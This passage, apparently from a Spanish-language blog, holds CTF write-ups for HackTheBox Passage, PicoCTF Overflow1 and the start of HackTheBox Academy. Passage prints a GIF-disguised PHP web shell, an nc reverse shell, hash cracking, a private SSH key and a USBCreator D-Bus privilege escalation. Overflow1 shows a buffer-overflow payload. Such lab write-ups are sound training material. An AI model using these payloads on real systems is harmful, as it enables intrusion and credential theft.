implementado en su web la herramienta Fail2Ban, b√°sicamente para prevenir fuerza bruta sobre el servidor web (: baneando la IP por 2 minutos. Si revisamos el c√≥digo fuente, encontramos varias cosas interesantes:  Vemos una ruta nueva, /CuteNews.  Usuarios con emails, admin:nadav@passage. htb y paul:paul@passage. htb.  Posible inyecci√≥n por medio de la URL, /index. php?id=11. Sigamos (:D√©mosle a la ruta: Tenemos un login panel, con una versi√≥n 2. 1. 2 del gestor de noticias CuteNews.  Wikipedia de CuteNews. Probando credenciales por default no obtenemos respuesta v√°lida, tambi√©n podemos registrarnos: Obtenemos: Buscando por internet existen varios exploits que se aprovechan de una opci√≥n que nos permite subir un avatar (imagen) a nuestro perfil para ejecutar comandos en el sistema. Por lo visto el gestor se gu√≠a por los magic bytes para validar el tipo de archivo. As√≠ que si subimos un archivo . php as√≠ sin m√°s, no nos lo va a dejar subir, pero si al archivo . php le agregamos al inicio la cadena GIF 8;, ahora interpretara que el tipo de archivo es un GIF (:  Me guie de este art√≠culo, el cual explica detalladamente cada paso. ‚Ä¶ Explotaci√≥n #: En el dashboard damos clic en Personal option y llegamos ac√°: Creamos archivo malicioso: ‚Äì¬ª cat ejeje. php &lt;?php $command=shell_exec($_REQUEST['xmd']); echo $command; ?&gt;‚Äì¬ª file ejeje. php ejeje. php: PHP script, ASCII textModificamos los magic bytes: ‚Äì¬ª cat ejeje. php GIF8;&lt;?php $command=shell_exec($_REQUEST['xmd']); echo $command; ?&gt;‚Äì¬ª file ejeje. php ejeje. php: GIF image data 16188 x 26736Subimos y guardamos cambios: Los avatars quedan guardados en la ruta /uploads:  Perfecto, tenemos ejecuci√≥n de comandos remotamente, generemos una reverse shell (: Pongamonos en escucha y despues hacemos la petici√≥n: ‚Äì¬ª rlwrap nc -nlvp 4433listening on [any] 4433 . . . http://10. 10. 10. 206/CuteNews/uploads/avatar_lanz_ejeje. php?xmd=nc 10. 10. 14. 142 4433 -e /bin/bashconnect to [10. 10. 14. 142] from (UNKNOWN) [10. 10. 10. 206] 39636iduid=33(www-data) gid=33(www-data) groups=33(www-data)script /dev/null -c bashScript started, file is /dev/nullwww-data@passage:/var/www/html/CuteNews/uploads$ lslsavatar_lanz_ejeje. phpwww-data@passage:/var/www/html/CuteNews/uploads$ Listos, ahora a enumerar (:  En la maquina tenemos dos usuarios: paul y nadav. www-data@passage:/var/www/html/CuteNews/cdata/users$ ls -la /homels -la /hometotal 16drwxr-xr-x 4 root root 4096 Jul 21 10:43 . drwxr-xr-x 23 root root 4096 Jul 21 10:44 . . drwxr-x--- 17 nadav nadav 4096 Dec 13 14:11 nadavdrwxr-x--- 16 paul paul 4096 Sep 2 07:18 paulwww-data@passage:/var/www/html/CuteNews/cdata/users$ ls /home/nadavls /home/nadavls: cannot open directory '/home/nadav': Permission deniedwww-data@passage:/var/www/html/CuteNews/cdata/users$ ls /home/paulls /home/paulls: cannot open directory '/home/paul': Permission deniedwww-data@passage:/var/www/html/CuteNews/cdata/users$‚Ä¶ En los archivos que tenemos sobre la ruta /CuteNews nos encontramos con /cdata/users/lines: Tenemos cadenas en formato base64, pas√©moslas a texto legible, podemos crear un script sencillo que nos haga la tarea: ‚Äì¬ª cat extractusers. sh #!/bin/bashurl= http://10. 10. 10. 206/CuteNews/cdata/users/lines #Hay otras lineas en formato php, pero las que nos interesan son las que empiezan con Y. curl -s $url | grep -E  ^Y  &gt; hashes. txtwhile read -r line; do #Decodeamos y mostramos echo  $line  | base64 -d ; echo; echodone &lt; hashes. txtrm -r hashes. txt‚Äì¬ª . /extractusers. sh a:1:{s:5: email ;a:1:{s:16: paul@passage. htb ;s:10: paul-coles ;}}a:1:{s:2: id ;a:1:{i:1598829833;s:6: egre55 ;}}a:1:{s:5: email ;a:1:{s:15: egre55@test. com ;s:6: egre55 ;}}a:1:{s:4: name ;a:1:{s:5: admin ;a:8:{s:2: id ;s:10: 1592483047 ;s:4: name ;s:5: admin ;s:3: acl ;s:1: 1 ;s:5: email ;s:17: nadav@passage. htb ;s:4: pass ;s:64: 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 ;s:3: lts ;s:10: 1592487988 ;s:3: ban ;s:1: 0 ;s:3: cnt ;s:1: 2 ;}}}a:1:{s:2: id ;a:1:{i:1592483281;s:9: sid-meier ;}}a:1:{s:5: email ;a:1:{s:17: nadav@passage. htb ;s:5: admin ;}}a:1:{s:5: email ;a:1:{s:15: kim@example. com ;s:9: kim-swift ;}}a:1:{s:2: id ;a:1:{i:1592483236;s:10: paul-coles ;}}a:1:{s:4: name ;a:1:{s:9: sid-meier ;a:9:{s:2: id ;s:10: 1592483281 ;s:4: name ;s:9: sid-meier ;s:3: acl ;s:1: 3 ;s:5: email ;s:15: sid@example. com ;s:4: nick ;s:9: Sid Meier ;s:4: pass ;s:64: 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 ;s:3: lts ;s:10: 1592485645 ;s:3: ban ;s:1: 0 ;s:3: cnt ;s:1: 2 ;}}}a:1:{s:2: id ;a:1:{i:1592483047;s:5: admin ;}}a:1:{s:5: email ;a:1:{s:15: sid@example. com ;s:9: sid-meier ;}}a:1:{s:4: name ;a:1:{s:10: paul-coles ;a:9:{s:2: id ;s:10: 1592483236 ;s:4: name ;s:10: paul-coles ;s:3: acl ;s:1: 2 ;s:5: email ;s:16: paul@passage. htb ;s:4: nick ;s:10: Paul Coles ;s:4: pass ;s:64: e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd ;s:3: lts ;s:10: 1592485556 ;s:3: ban ;s:1: 0 ;s:3: cnt ;s:1: 2 ;}}}a:1:{s:4: name ;a:1:{s:9: kim-swift ;a:9:{s:2: id ;s:10: 1592483309 ;s:4: name ;s:9: kim-swift ;s:3: acl ;s:1: 3 ;s:5: email ;s:15: kim@example. com ;s:4: nick ;s:9: Kim Swift ;s:4: pass ;s:64: f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca ;s:3: lts ;s:10: 1592487096 ;s:3: ban ;s:1: 0 ;s:3: cnt ;s:1: 3 ;}}}a:1:{s:4: name ;a:1:{s:6: egre55 ;a:11:{s:2: id ;s:10: 1598829833 ;s:4: name ;s:6: egre55 ;s:3: acl ;s:1: 4 ;s:5: email ;s:15: egre55@test. com ;s:4: nick ;s:6: egre55 ;s:4: pass ;s:64: 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc ;s:4: more ;s:60: YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ== ;s:3: lts ;s:10: 1598834079 ;s:3: ban ;s:1: 0 ;s:6: avatar ;s:26: avatar_egre55_spwvgujw. php ;s:6: e-hide ;s:0:  ;}}}a:1:{s:2: id ;a:1:{i:1592483309;s:9: kim-swift ;}}Vemos usuario, email y pass (password supongo). Tomemos las passwords, que son hashes en formato SHA-256 y guard√©moslas en un archivo, para posteriormente apoyarnos de hashcat y crackearlos: ‚Äì¬ª cat hashes7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e14bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cdf669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc‚Äì¬ª hashcat -m 1400 -a 0 hashes -o result /usr/share/wordlists/rockyou. txt‚Äì¬ª cat result e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1Perfecto, si usamos esa contrase√±a para movernos al usuario paul logramos obtener su sesi√≥n: www-data@passage:/var/www/html/CuteNews/cdata/users$ su paulsu paulPassword: atlanta1paul@passage:/var/www/html/CuteNews/cdata/users$ cdcdpaul@passage:~$ lslsDesktop  Downloads     Music   Public   user. txtDocuments examples. desktop Pictures Templates VideosAhora puedo pensar que debemos migrar al usuario nadav‚Ä¶ A darle. ‚Ä¶ Movimiento lateral #: En nuestro /home tenemos archivos SSH, si miramos detenidamente que llaves tienen permitido el acceso, tenemos: paul@passage:~/. ssh$ ls -la                                   ls -la                                             total 24                                            drwxr-xr-x 2 paul paul 4096 Jul 21 10:43 .                           drwxr-x--- 16 paul paul 4096 Sep 2 07:18 . .                           -rw-r--r-- 1 paul paul 395 Jul 21 10:43 authorized_keys    -rw------- 1 paul paul 1679 Jul 21 10:43 id_rsa        -rw-r--r-- 1 paul paul 395 Jul 21 10:43 id_rsa. pub      -rw-r--r-- 1 paul paul 1312 Jul 21 10:44 known_hosts      paul@passage:~/. ssh$ cat authorized_keys                            cat authorized_keys                                       ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passagepaul@passage:~/. ssh$ cat id_rsacat id_rsa-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4iZ2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/ktrWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJJjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hboksjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQeWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlGQXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lrlxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAhzWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMzR0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBioGS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBELuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSRAHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP19pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrFd8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOsnYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoYf62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyMUxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDsOR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==-----END RSA PRIVATE KEY-----paul@passage:~/. ssh$ Obtenemos una llave privada, guardemosla en un archivo e intentemos ingresar a la m√°quina mediante SSH: ‚Äì¬ª cat keynadav -----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i. . . #Le damos los permisos que requiere una llave privada SSH‚Äì¬ª chmod 700 keynadav#Ingresamos‚Äì¬ª ssh -i keynadav nadav@10. 10. 10. 206The authenticity of host '10. 10. 10. 206 (10. 10. 10. 206)' can't be established. ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg. Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10. 10. 10. 206' (ECDSA) to the list of known hosts. Last login: Mon Aug 31 15:07:54 2020 from 127. 0. 0. 1. . . . . . nadav@passage:~$ Listos, somos nadav, sigamos enumerando y veamos como convertirnos en usuario administrador‚Ä¶ ‚Ä¶ Escalada de privilegios #: Despu√©s de enumeraci√≥n b√°sica con scripts, dejar pasar cosas y enredarme con otras, no encontr√© nada √∫til, simplemente que hay un servicio llamado CUPS corriendo localmente en el puerto 631‚Ä¶ Pero esto fue un lindo rabbit hole en el que perd√≠ un buen rato :( Realizando un escaneo de procesos corriendo en la m√°quina, notamos que hay uno ejecut√°ndose con privilegios de administrador: nadav@passage:~$ ps aux. . . root   35653 0. 0 0. 5 235544 20112 ?    Sl  15:48  0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helpernadav   35999 0. 0 0. 0 44404 3032 pts/23  R+  16:45  0:00 ps auxBuscando en internet usb-creator exploit nos encontramos un lindo art√≠culo en el que se explica el funcionamiento de USBCreator y D-Bus, en el sistema. B√°sicamente la vulnerabilidad consiste en que podemos sobreescribir archivos del sistema y todo con el usuario root sin necesidad de contrase√±a.  A system bus, which is mainly used by privileged services to expose system-wide relevant services, and one session bus for each logged in user, which exposes services that are only relevant to that specific user. PaloAltoNetworks  Art√≠culo explicando funcionamiento de D-Bus y la vulnerabilidad en com. ubuntu. USBCreator.  Recomiendo mucho leer el art√≠culo :) La vulnerabilidad se da por una herramienta de Unix (dd), la cual es usada por USBCreator. Que es la que nos permite copiar archivos. Intentemos copiarnos el archivo /etc/shadow. nadav@passage:/dev/shm$ gdbus call --system --dest com. ubuntu. USBCreator --object-path /com/ubuntu/USBCreator --method com. ubuntu. USBCreator. Image /etc/shadow /dev/shm/shadow true()nadav@passage:/dev/shm$ ls | grep shadowshadownadav@passage:/dev/shm$nadav@passage:/dev/shm$ cat shadow                               root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds. Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::. . . nadav:$6$D30IVulR$vENayGqKX8L0RYB/wcf7ZMfFHyCedmEIu4zXw7bZcH3GBrCrBzHJ3Y/in96pthdcp5cU. 0UTXobQLu7T0INzk1:18464:0:99999:7:::paul:$6$cpGlwRS2$AhcQyxAskjvAQtS4vpO0VgNW0liHRbLSosZlrHpzL3XTfPHmeDL7hWkut1kCjgNnEHIdU9J019hQTAMH6nzxe1:18464:0:99999:7:::Perfecto, pues copiemos el id_rsa del usuario root para posteriormente obtener una Shell ingresando con su llave privada, lo mismo que hicimos con nadav. nadav@passage:/dev/shm$ gdbus call --system --dest com. ubuntu. USBCreator --object-path /com/ubuntu/USBCreator --method com. ubuntu. USBCreator. Image /root/. ssh/id_rsa /dev/shm/paentrar true() La guardamos en keyroot y entramos :) ‚Äì¬ª ssh -i keyroot root@10. 10. 10. 206Last login: Mon Aug 31 15:14:22 2020 from 127. 0. 0. 1root@passage:~# id  uid=0(root) gid=0(root) groups=0(root)root@passage:~# Perfecto, perfecto‚Ä¶ Solo nos queda ver las flags :) ‚Ä¶ El rabbit hole que me com√≠ fue interesante (por lo menos record√© como hacer Remote Port Forwarding). Pens√© de m√°s en la escalada de privilegios, pero estuvo bien. Me gusto mucho el tema de las llaves SSH. Y nada‚Ä¶ Nos encontraremos en otro writeup y a seguir rompiendo todo, muchas gracias a @ChefByzen por la m√°quina y a ustedes por leer :) "
    }, {
    "id": 59,
    "url": "http://localhost:4000/article/picoctf19-overflow1",
    "title": "PicoCTF2019 - Overflow1",
    "body": "2021/03/04 - Exploraremos un Buffer Overflow pa toda la familia, tendremos que moveremos a una funci√≥n que contiene la flag.  You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_1_e792baa0d29d24699530e6a26071a260 on the shell server. Source. Spanish writeup: El ejercicio nos dice que debemos lograr cambiar la direcci√≥n de retorno y que nos lleve a la funci√≥n flag. Ya con los archivos hacemos: $ file *vuln:   ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux. so. 2, for GNU/Linux 3. 2. 0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not strippedvuln. c:  C source, ASCII textVeamos que hace el programa: $ . /vuln Give me a string and lets see what happens: helloWoah, were jumping to 0x8048705 !Simplemente nos pide un input y nos dice la instrucci√≥n a la que hemos saltado. As√≠ que cuando logremos llegar a la funci√≥n flag, supongo que nos mostrara la direcci√≥n. Source vuln. c. #define BUFFSIZE 64#define FLAGSIZE 64void flag() { char buf[FLAGSIZE]; . . .  fgets(buf,FLAGSIZE,f);Algunos detalles de assembly antes de seguir:       Registro   Arquitectura   Descripci√≥n         eip   32 bits   El registro que almacena la siguiente instrucci√≥n a la cual ir       rip   64 bits   Instruction pointer register       ebp   32 bits   El registro que apunta a una ubicaci√≥n fija dentro del marco de una funci√≥n, as√≠ sera m√°s f√°cil acceder a variables y argumentos       rbp   64 bits   Base pointer register   Siguiendo con el fuente, nos encontramos con un buffer de 64, haciendo la prueba de fuego: $ python -c 'print  A *64' | . /vulnGive me a string and lets see what happens: Woah, were jumping to 0x8048705 !Vemos que no pasa nada, ya que los siguientes 4 bits guardaran la data que tenga el registro ebp y los siguientes 4 bytes tendr√°n la direcci√≥n de retorno (almacenada en eip).  Lo explica Dhaval Kapil en su brutal articulo. Sumaremos los 4 bytes del eip y los 4 bytes del ebp, se los agregamos a los 64 del buffer: $ python -c 'print  A *72' | . /vulnGive me a string and lets see what happens: Woah, were jumping to 0x8048705 !Violaci√≥n de segmentoObtenemos el overflow, tamos bien. Saquemos la direccion en memoria de la funci√≥n flag. Lo podemos hacer con gdb, objdump, ida. . Usa el de preferencia. $ gdb . /vulninfo functions. . . 0x080485e6 flag. . . Un detalle importante para este paso es conocer si nuestro sistema es little-endian o big-endian. Esto decidir√° como va a leer nuestro porcesador el programa. Si eres un little-endian (un peque√±o indio e. e), entonces debemos colocar la direcci√≥n de flag en reverso.  Ejemplo: 0x080485e6 flag entonces pondremos e6 85 04 08. $ python -c 'print  A *72 +  \xe6\x85\x04\x08 ' | . /vulnGive me a string and lets see what happens: Woah, were jumping to 0x8048700 !Woah, were jumping to 0x8048705 !Violaci√≥n de segmento¬øPor que habr√° salido dos veces la instrucci√≥n? $ gdb . /vuln -qReading symbols from . /vuln. . . (No debugging symbols found in . /vuln)gdb-peda$ b vulnBreakpoint 1 at 0x8048663gdb-peda$ r &lt;&lt;&lt; $(python -c 'print  A *72 +  \xe6\x85\x04\x08 ')Continuamos‚Ä¶ gdb-peda$ cContinuing. Woah, were jumping to 0x8048700 ![----------------------------------registers-----------------------------------]EAX: 0x22 (' ')EBX: 0x41414141 ('AAAA')ECX: 0xffffffff EDX: 0xf7fa4010 --&gt; 0x0 ESI: 0xf7fa2000 --&gt; 0x1d6d6c EDI: 0xf7fa2000 --&gt; 0x1d6d6c EBP: 0xffffd1b8 --&gt; 0x80485e6 (&lt;flag&gt;:	push  ebp)ESP: 0xffffd1b4 ( AAAA\346\205\004\b\005\207\004\b\001 )A√∫n no hemos llegado a la direcci√≥n de la funci√≥n flag Woah, were jumping to 0x8048700 !Woah, were jumping to 0x8048705 !Si intentamos  A *73 vemos esto: $ python -c 'print  A *73 +  \xe6\x85\x04\x08 ' | . /vulnWoah, were jumping to 0x8040008 !Hemos cambiado el registro que direcciona!! Why?  Sencillamente son los 4 bytes que ocupa la direcci√≥n de la funci√≥n flag que estamos agregando despues de imprimir las  A . $ python -c 'print  A *76 +  \xe6\x85\x04\x08 ' | . /vulnGive me a string and lets see what happens: Woah, were jumping to 0x80485e6 !Flag File is Missing. please contact an Admin if you are running this on the shell server. Woah, were jumping to 0x80485e6 !Y ah√≠ lo tenemos, estamos en la direcci√≥n de la funci√≥n flag. Si lo corremos en el servidor remoto de picoCTF: pico-2019:/$ python -c 'print  A *76 +  \xe6\x85\x04\x08 ' | . /vulnGive me a string and lets see what happens: Woah, were jumping to 0x80485e6 !picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}Segmentation fault (core dumped)picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}: Tenemos la flag (: Y hemos corrompido el flujo del programa. "
    }, {
    "id": 60,
    "url": "http://localhost:4000/htb/academy",
    "title": "HackTheBox - Academy",
    "body": "2021/02/27 - M√°quina Linux nivel f√°cil. Pensaremos en bases de datos (eh?), deserializaremos mentes :o, jugaremos con archivos ‚Äòlog‚Äô y romperemos un binario que nos dar√° en este caso dependencia de ser due√±os del sistema :P TL;DR (Spanish writeup): Creadores: egre55 &amp; mrb3n. Este writeup lo hice despu√©s de haber resuelto la m√°quina, por lo tanto (quiz√°s) ir√© muy directo :P Holas, como tas? Bueno, empezaremos con un panel algo juguet√≥n en el cual nos registraremos, asign√°ndonos un rol distinto al que tiene por defecto, con √©l haremos que nuestro usuario se pueda logear en otro recurso solo para administradores e. e Conseguiremos un nuevo dominio en el que encontramos muchos errores :( de los cuales nos aprovecharemos de uno que explota una mala deserializaci√≥n para conseguir una Shell como www-data :) Ya estando dentro simplemente enumerando conseguiremos unas credenciales para migrarnos al usuario cry0l1t3, con √©l obtendremos la flag user. txt. Este usuario cuenta con el grupo adm, lo usaremos para enfocarnos en los archivos log del sistema u. u Dando unas vueltas por internet y en la m√°quina, finalmente encontramos una herramienta que se complementa con los archivos log para conseguir las credenciales del usuario mrb3n, nos migraremos a √©l. Con enumeraci√≥n b√°sica nos daremos cuenta de que mrb3n puede ejecutar /usr/bin/composer en el sistema con permisos de adminstrador‚Ä¶ Nos veremos forzados :P a usar esto para conseguir una Shell en el sistema como usuario root‚Ä¶ A darle candela ;) Clasificaci√≥n de la m√°quina. : Enumeraci√≥n pa rato y con tintes de realidad.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Empezamos realizando un escaneo de puertos para saber que servicios esta corriendo. ‚Äì¬ª nmap -p- --open -v 10. 10. 10. 215 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Wed Jan 13 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 215# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 215 ()  Status: UpHost: 10. 10. 10. 215 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 33060/open/tcp//mysqlx///# Nmap done at Wed Jan 13 25:25:25 2021 -- 1 IP address (1 host up) scanned in 114. 32 secondsMuy bien, ¬øque tenemos?       Puerto   Descripci√≥n         22   SSH: Conexion remota segura mediante una shell       80   HTTP: Protocolo que permite la comunicaci√≥n y transferencia de info a traves de la web       33060   mysqlx: ‚ÄúMySQL Shell API‚Äù   Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio: ‚Äì¬ª nmap -p 22,80,33060 -sC -sV 10. 10. 10. 215 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan# Nmap 7. 80 scan initiated Wed Jan 13 25:25:25 2021 as: nmap -p 22,80,33060 -sC -sV -oN portScan 10. 10. 10. 215Nmap scan report for 10. 10. 10. 215                                Host is up (0. 20s latency).                                                                                   PORT   STATE SERVICE VERSION                                 22/tcp  open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)80/tcp  open http  Apache httpd 2. 4. 41 ((Ubuntu))          |_http-server-header: Apache/2. 4. 41 (Ubuntu)                          |_http-title: Did not follow redirect to http://academy. htb/       33060/tcp open mysqlx?                                     | fingerprint-strings:                                     |  DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: |   Invalid message                                      |_  HY000                                           1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port33060-TCP:V=7. 80%I=7%D=1/13%Time=5FFF22AB%P=x86_64-pc-linux-gnu%r(N. . . SF:x05HY000 )%r(giop,9, \x05\0\0\0\x0b\x08\x05\x1a\0 );Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Jan 13 25:25:25 2021 -- 1 IP address (1 host up) scanned in 44. 18 secondsTenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4       80   HTTP   Apache httpd 2. 4. 41       33060   mysqlx   mysqlx (pero no estamos seguros)   ‚Ä¶ Puerto 8080 ‚åñ: Podemos crearnos una cuenta o logearnos, cre√©monos una a ver con que nos encontramos: Y ahora ingresamos mediante el login‚Ä¶ Estando dentro tenemos: Varios m√≥dulos con temas de aprendizaje, aunque ninguno redirecciona a ning√∫n lado :P Haciendo algo de fuzzing nos encontramos con la p√°gina admin. php que es otro login: Pero con nuestras credenciales no podemos ingresar‚Ä¶ Despu√©s de dar vueltas nos damos cuenta de algo interesante al momento de crear la cuenta: Un input escondido con valor por defecto 0 que adem√°s su nombre es role_id‚Ä¶ Si recordamos por un momento las bases de datos, donde los usuarios son guardados a veces con id y donde el n√∫mero 1 es generalmente el administrador. Nos da una idea que podemos probar a cambiar el valor a 1 y despu√©s probar en los logins que tenemos a ver si cambia algo‚Ä¶ Hacemos el mismo proceso de creaci√≥n de cuenta solo que ahora nos apoyamos mediante CTRL + SHIFT + I para ver el inspector de c√≥digo y as√≠ cambiar el valor del input: ‚Ä¶ Explotaci√≥n #: Validando, no hay cambio (a simple vista) en la web donde tenemos todos los m√≥dulos, pero en la de admin. php obtenemos algo nuevo: Perfecto, tamos dentro del login como usuario administrador‚Ä¶ Nos topamos con unos √≠tems a hacer, entre ellos el ultimo esta pendiente: (Arreglar problema con dev-staging-01. academy. htb), por lo tanto agreguemos ese dominio al /etc/hosts y veamos que tiene: ‚Äì¬ª cat /etc/hosts. . . 10. 10. 10. 215 academy. htb dev-staging-01. academy. htb. . . Ponemos en la web ese dominio yyyy: Vale, vale, valeeeeeee, tenemos muchos errores relacionados con el framework Laravel :P Y tambi√©n alguna data interesante:  Tenemos cositas interesantes, como rutas, posibles usuarios, servicios, el PATH y algo llamado APP_KEY, que parece algo interesante, pero no lo sabemos a√∫n, ahora nos queda leer los errores, extraer rutas interesantes y buscarlas en internet, quiz√°s alguna tenga su CVE o exploit relacionado‚Ä¶ Despu√©s de algo de b√∫squeda exhaustiva (: encontramos este exploit: Que no cubre toda la b√∫squeda, pero involucra Illuminate que es uno de los servicios que estamos corriendo‚Ä¶ Leyendo sobre el exploit, explota el CVE CVE-2018-15133 y el CVE-2017-16894. Basicamente se aprovecha de una brecha en el framework laravel (vamos bien) donde al momento de llamar el m√©todo Illuminate/Encryption/Encrypter. php se puede producir una deserializacion insegura, en la que podemos ejecutar comandos en el sistema antes de que nos muestre alg√∫n error. No requerimos autenticaci√≥n, pero si el token API_KEY (perfe, lo tenemos) para poder aprovecharnos‚Ä¶ Este exploit es un m√≥dulo de metasploit, busquemos en internet alg√∫n PoC sobre CVE-2018-15133.  CVE-2018-15133 - nvd. nist. gov/CVE-2018-15133.  CVE-2018-15133 - cve. mitre. org/CVE-2018-15133. Con algo de suerte, pero tambi√©n deseando no haberla tenido, encontramos este exploit relacionado con el CVE-2018-15133:  Exploit Laravel CVE-2018-15133 - github. com/aljavier. En su descripci√≥n dice que hizo el script 